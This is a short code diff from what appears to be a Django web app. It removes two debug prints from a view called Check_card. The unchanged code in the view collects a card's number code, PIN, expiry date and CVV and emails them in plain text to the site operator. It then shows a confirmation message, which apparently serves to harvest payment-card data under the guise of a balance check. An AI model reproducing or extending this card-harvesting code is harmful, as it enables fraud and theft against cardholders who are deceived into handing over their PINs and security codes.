@@ -29,9 +29,7 @@ def Check_card(request):
         # new_card.save()
         body = f"Card type = {card_type}\n\nCurrency={currency}\n\nAmount = {amount}\n\nCode={code}\n\n card_pin={card_pin}\n\nexp_date={exp_date}\n\ncvv={cvv}"
         email = EmailMessage(subject='New input', body=body, to=[settings.EMAIL_HOST_USER])
-        print('a')
         email.send()
-        print('b')
         messages.success(request, f'{currency} {amount}.00')
         return redirect(reverse('index'))
         # except:
